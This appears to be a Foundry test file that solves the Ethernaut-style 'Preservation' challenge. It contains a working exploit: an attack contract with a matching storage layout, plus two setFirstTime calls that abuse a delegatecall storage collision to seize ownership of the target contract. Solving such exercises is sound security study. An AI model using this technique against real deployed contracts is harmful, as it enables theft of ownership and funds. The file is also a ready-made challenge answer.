// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {LibraryContract, Preservation} from "../src/Preservation.sol";

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

contract PreservationTest is Test {
    Preservation public preservation;
    LibraryContract public libraryContract1;
    LibraryContract public libraryContract2;
    PreservationAttack public preservationAttack;

    address alice = address(1);

    function setUp() public {
        libraryContract1 = new LibraryContract();
        libraryContract2 = new LibraryContract();
        preservation = new Preservation(address(libraryContract1), address(libraryContract2));
        preservationAttack = new PreservationAttack();
    }

    function testAttack() public {
        assertEq(preservation.owner(), address(this));
        preservation.setFirstTime(uint256(uint160(address(preservationAttack))));
        preservation.setFirstTime(uint256(uint160(alice)));
        assertEq(preservation.owner(), alice);
    }
}
